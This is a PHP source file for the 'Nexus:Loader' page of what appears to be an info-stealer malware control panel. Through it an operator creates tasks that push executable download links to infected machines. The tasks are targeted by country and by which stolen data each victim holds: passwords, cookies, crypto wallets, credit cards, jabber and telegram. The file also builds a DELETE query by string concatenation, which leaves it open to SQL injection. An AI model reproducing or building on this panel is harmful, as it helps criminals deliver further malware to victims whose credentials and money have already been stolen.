<?php 
   session_start();
   include 'database.php';
	require_once("auth.php");
$delete = formatString($_GET["delete"]);

if ($delete != null) {
    $pdoConnection->exec("DELETE FROM `tasks` WHERE id = '" . formatString($delete) . "'");
    header("Location: loader.php", true, 301);
}

function formatString($param)
{
    $returnString = $param;
    $returnString = trim($returnString);
    $returnString = stripslashes($returnString);
    $returnString = htmlspecialchars($returnString);

    return $returnString;
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>Nexus:Loader</title>
  <!-- plugins:css -->
      <script src="js/jquery.js"></script>
	  	<script defer src="js/main.js"></script>
	      <link rel="stylesheet" href="css/switch.css">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
     <link id="style" rel="stylesheet" href="css/<?php if($_COOKIE["nightmode"]=="true") echo "dark";?>style.css">
  <!-- endinject -->
  <link rel="shortcut icon" href="images/favicon.png" />
</head>

<body onload="updateLoader()">
  <div class="container-scroller">
    <?php include "partials/_navbar.php";?>
    <div class="container-fluid page-body-wrapper">
      <div class="main-panel">
        <div class="content-wrapper">
		
		<div class="col-12 grid-margin">
              <div class="card">
                <div class="card-body">
                  <form method="POST" class="forms-sample">
				  <input type="hidden" name="edit" value="">
				  <div class="form-group">
                      <label for="exampleInputUsername1">Name</label>
                      <input type="text" class="form-control" name="name" >
                    </div>
				  <div class="form-group">
                      <label for="exampleInputUsername1">Preset</label>
                      <select class="form-control" name="preset">
											<option value="all" selected="">All</option>
											<?php
											$presets = $pdoConnection->query("SELECT * FROM `presets`");
											while ($preset = $presets->fetch(PDO::FETCH_ASSOC))
											{
												echo '<option value="'.$preset["name"].'">'.$preset["name"]."</option>";
											}
											?>
						</select>
                    </div>
                    <div class="form-group">
                      <label for="exampleInputEmail1">Count</label>
                      <input type="text" class="form-control" name="count" placeholder="0 for infinite quantity executions">
                    </div>
                    <div class="form-group">
                      <label for="exampleInputPassword1">Country(abbreviated)</label>
                      <input type="text" class="form-control" name="country" placeholder="* for any country">
                    </div>
                    <div class="form-group">
                      <label for="exampleInputConfirmPassword1">Links (separate with commas)</label>
                      <input type="text" class="form-control" name="task" placeholder="http://domain.com/file1.exe;http://domain.com/file2.exe;">
                    </div>
					<div style="float: left;
    width: 25%;">
                    <div class="form-check form-check-flat form-check-primary">
                      <label class="form-check-label">
                        <input type="checkbox" name="pass" class="form-check-input">
                        With passwords
                      </label>
                    </div>
					<div class="form-check form-check-flat form-check-primary">
                      <label class="form-check-label">
                        <input type="checkbox" name="cookie" class="form-check-input">
                        With cookies
                      </label>
                    </div>
					<div class="form-check form-check-flat form-check-primary">
                      <label class="form-check-label">
                        <input type="checkbox" name="wallet" class="form-check-input">
                        With wallets
                      </label>
                    </div>
					</div>
					<div style="float: left;
    width: 25%;">
	<div class="form-check form-check-flat form-check-primary">
                      <label class="form-check-label">
                        <input type="checkbox" name="cc" class="form-check-input">
                        With CC
                      </label>
                    </div>
					<div class="form-check form-check-flat form-check-primary">
                      <label class="form-check-label">
                        <input type="checkbox" name="jabb" class="form-check-input">
                        With jabber
                      </label>
                    </div>
					<div class="form-check form-check-flat form-check-primary">
                      <label class="form-check-label">
                        <input type="checkbox" name="tg" class="form-check-input">
                        With telegram
                      </label>
                    </div>
					</div>
					<div style="clear:both;">
					<center>
                    <button type="button" onclick="submitLoader()" name="create" class="btn btn-primary mr-2">Create</button>
					</center>
					</div>
                  </form>
                </div>
              </div>
            </div>
		<div class="col-12 grid-margin">
		  <div class="card">
            <div class="card-body">
                <div class="col-12 table-responsive">
                  <table class="table">
                                <thead>
                                <tr>
                                    <th style="display:none;">ID</th>
									<th>Preset</th>
                                    <th>Name</th>
									<th>Params</th>
                                    <th>Count</th>
                                    <th>Country</th>
									<th>Link</th>
                                    <th>Status</th>
                                    <th>Actions</th>
                                </tr>
                                </thead>
                                <tbody>
                               
                                </tbody>
                            </table>
				  </div>
              </div>
            </div>
          </div>
		   </div>
        </div>
        <!-- content-wrapper ends -->
        <!-- partial:partials/_footer.html -->
        <!-- partial -->
      </div>
      <!-- main-panel ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
</body>

</html>
